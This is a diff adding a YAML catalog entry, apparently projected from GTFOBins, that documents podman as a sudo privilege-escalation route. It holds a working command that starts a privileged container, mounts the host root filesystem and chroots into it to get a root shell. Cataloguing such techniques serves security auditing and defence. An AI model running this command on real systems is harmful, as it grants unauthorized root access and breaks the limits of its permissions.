@@ -1,0 +1,79 @@
+id: gtfobins/podman/shell/sudo
+type: binary
+platform: linux
+name: podman
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
+  comment: This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
+references:
+- https://gtfobins.github.io/gtfobins/podman/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        podman:
+          functions:
+            shell:
+            - code: podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
+              comment: This requires an actual image to be available (e.g., `alpine`) downloading it if
+                not present.
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/podman/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:eec3214859c176821582a4a45d1da8d13f50d37c3e7fa7eea19b176cc23c879e
